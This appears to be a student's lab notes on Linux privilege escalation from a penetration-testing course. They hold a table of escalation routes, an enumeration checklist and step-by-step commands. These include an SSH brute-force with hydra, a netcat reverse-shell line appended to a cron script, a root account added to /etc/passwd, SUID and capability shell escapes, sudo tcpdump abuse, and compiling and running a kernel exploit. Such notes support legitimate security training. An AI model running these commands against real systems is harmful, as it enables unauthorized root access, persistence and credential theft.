

|     Attack Vector      |                                           Path to Root                                           |             Tools             |
| :--------------------: | :----------------------------------------------------------------------------------------------: | :---------------------------: |
|    **SUID Binary**     | Find SUID binary → Identify vulnerable binary → Execute with root privileges → Spawn root shell  |    find, GTFOBins, strings    |
|    **Sudo Rights**     |     Check sudo rights → Identify vulnerable command → Bypass restrictions → Execute as root      |  sudo -l, GTFOBins, sudoers   |
|   **Kernel Exploit**   |    Identify kernel version → Find matching exploit → Compile exploit → Execute for root shell    |  uname -a, searchsploit, gcc  |
|     **Cron Jobs**      |      Find writable cron job → Replace script content → Wait for execution → Gain root shell      | pspy, crontab, systemd-timers |
|   **Path Injection**   |  Identify relative paths → Create malicious binary → Add writable dir to PATH → Wait execution   |  echo $PATH, strace, ltrace   |
|    **Capabilities**    |        Find binaries with capabilities → Abuse cap_setuid/dac_read → Set UID 0 → Get root        |     getcap, setcap, capsh     |
|     **LD_PRELOAD**     |   Find sudo/SUID with LD_PRELOAD → Create malicious .so → Load library → Hook function → Root    | ldd, gcc, /etc/ld.so.preload  |
|    **Docker Group**    |           Check docker group → Mount host filesystem → Chroot to host → Access as root           |   docker ps, mount, chroot    |
|  **Wildcard Inject**   | Find command using wildcards → Create malicious files → Trigger command → Execute arbitrary code |  pspy, --checkpoint actions   |
|  **Service Exploit**   | Identify vulnerable service → Find writable config/binary → Modify execution → Restart for root  |  ps aux, systemctl, service   |
| **NFS no_root_squash** |         Find NFS export → Mount share → Create SUID binary → Execute on target for root          |     showmount, mount, gcc     |
|    **Memory Dumps**    |           Find core_pattern → Create memory dump → Extract credentials → Use for root            |     gcore, strings, grep      |
|     **LXD Group**      |             Check LXD group → Import container → Mount host fs → Chroot to gain root             |     lxc image import, lxd     |
|     **Disk Group**     |               Check disk group → Read raw disk → Extract creds/data → Use for root               |     fdisk, debugfs, mount     |
|     **Timer Jobs**     |           Find writable timer → Modify service file → Wait execution → Get root shell            |     systemctl list-timers     |
|   **Log Injection**    |          Find writable logs → Inject code into log → Trigger log read → Execute as root          |        logger, tail -f        |
|   **Shared Library**   |            Find writable .so → Replace with malicious version → Wait load → Get root             |      ldd, ldconfig, gcc       |
|    **Root Process**    |         Find root process → Identify race condition → Exploit timing → Escalate to root          |     pspy, ps aux, strace      |
|    **DBUS Exploit**    |        Find vulnerable DBUS service → Send crafted message → Trigger execution → Get root        |   d-feet, gdbus, dbus-send    |
|     **Snap Abuse**     |     Check snap privileges → Create malicious snap → Install with --devmode → Escape to root      |    snapcraft, snap install    |



**Linux Privilege Escalation Checklist**

1. **Current User & Identity**
    
    - `id`
2. **Enumerate Users**
    
    - `cat /etc/passwd`
3. **Hostname & System Identity**
    
    - `hostname`
4. **OS & Kernel Information**
    
    - `cat /etc/issue`
    - `cat /etc/os-release`
    - `uname -a`
5. **Running Processes**
    
    - `ps aux`
6. **Network Interfaces**
    
    - `ip a`
7. **Routing Table**
    
    - `routel`
8. **Active Network Connections**
    
    - `ss -anp`
9. **Firewall Rules**
    
    - `cat /etc/iptables/rules.v4`
10. **Scheduled Tasks (Cron Jobs)**
    
    - `ls -lah /etc/cron*`
    - `crontab -l`
    - `sudo crontab -l`
11. **Installed Packages (Debian)**
    
    - `dpkg -l`
12. **World-Writable Directories**
    
    - `find / -writable -type d 2>/dev/null`
13. **Mounted Filesystems & Drives**
    
    - `cat /etc/fstab`
    - `mount`
    - `lsblk`
14. **Loaded Kernel Modules**
    
    - `lsmod`
15. **Module Details (Example: libata)**
    
    - `/sbin/modinfo libata`
16. **SUID Files**
    
    - `find / -perm -u=s -type f 2>/dev/null`

**Linux Privilege Escalation Checklist**

1. **Automated Enumeration**
    
    - Run the tool (basic info):  
        `unix-privesc-check`
    - Run in standard mode and save output:  
        `./unix-privesc-check standard > output.txt`
2. **Inspect User Trails**
    
    - Check environment variables:  
        `env`
    - Inspect shell configuration:  
        `cat .bashrc`
    - Attempt to become root via known credentials:  
        `su - root`  
        _(then verify with `whoami`)_
    - Generate a custom wordlist:  
        `crunch 6 6 -t Lab%%% > wordlist`
    - Verify wordlist content:  
        `cat wordlist`
    - Brute-force SSH login for user eve:  
        `hydra -l eve -P wordlist 192.168.50.214 -t 4 ssh -V`
    - Log in as eve:  
        `ssh eve@192.168.50.214`
    - Check sudo rights:  
        `sudo -l`
    - Escalate to root using sudo:  
        `sudo -i`  
        _(verify with `whoami`)_
3. **Inspect Service Footprints**
    
    - Monitor processes for leaked credentials:  
        `watch -n 1 "ps -aux | grep pass"`
    - Capture loopback traffic for password data:  
        `sudo tcpdump -i lo -A | grep "pass"`
**17.3.1 Abusing Cron Jobs**

- `grep "CRON" /var/log/syslog`
- `cat /home/joe/.scripts/user_backups.sh`
- `ls -lah /home/joe/.scripts/user_backups.sh`
- `cd .scripts`
- `echo >> user_backups.sh`
- `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_backups.sh`
- `cat user_backups.sh`
- `nc -lnvp 1234`

---

**17.3.2 Abusing Password Authentication**

- `openssl passwd w00t`
- `echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd`
- `su root2`
- `id`

---

**17.4.1 Abusing Setuid Binaries & Capabilities**

- Run passwd to keep the process active:
    - `passwd`
- Identify passwd process:
    - `ps u -C passwd`
    - `cat /proc/1932/status | grep Uid`
    - `cat /proc/1131/status | grep Uid`
- Check SUID flag:
    - `ls -asl /usr/bin/passwd`
- Abuse SUID binary:
    - `find /home/joe/Desktop -exec "/usr/bin/bash" -p \;`  
        _(Then verify with: `id` and `whoami`)_
- Enumerate capabilities:
    - `/usr/sbin/getcap -r / 2>/dev/null`
- Exploit Perl with capabilities:
    - `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`

---

**17.4.2 Abusing Sudo**

- List allowed sudo commands:
    - `sudo -l`
- Tcpdump-based exploit attempt:
    - `COMMAND='id'`
    - `TF=$(mktemp)`
    - `echo "$COMMAND" > $TF`
    - `chmod +x $TF`
    - `sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root`
- Inspect syslog for tcpdump events:
    - `cat /var/log/syslog | grep tcpdump`
- Check AppArmor status (as root):
    - `su - root`
    - `aa-status`
- Exploit apt-get:
    - `sudo apt-get changelog apt`  
        _(Shell payload from apt-get should grant root; verify with: `id`)_

---

**17.4.3 Exploiting Kernel Vulnerabilities**

- Gather system info:
    - `cat /etc/issue`
    - `uname -r`
    - `arch`
- Search for kernel exploits:
    - `searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep "4." | grep -v " < 4.4.0" | grep -v "4.8"`
- Prepare exploit source:
    - `cp /usr/share/exploitdb/exploits/linux/local/45010.c .`
    - `head 45010.c -n 20`
    - `mv 45010.c cve-2017-16995.c`
- Transfer exploit to target:
    - `scp cve-2017-16995.c joe@192.168.123.216:`
- Compile on target:
    - `gcc cve-2017-16995.c -o cve-2017-16995`
    - `file cve-2017-16995`
- Run exploit and verify:
    - `./cve-2017-16995`
    - `id`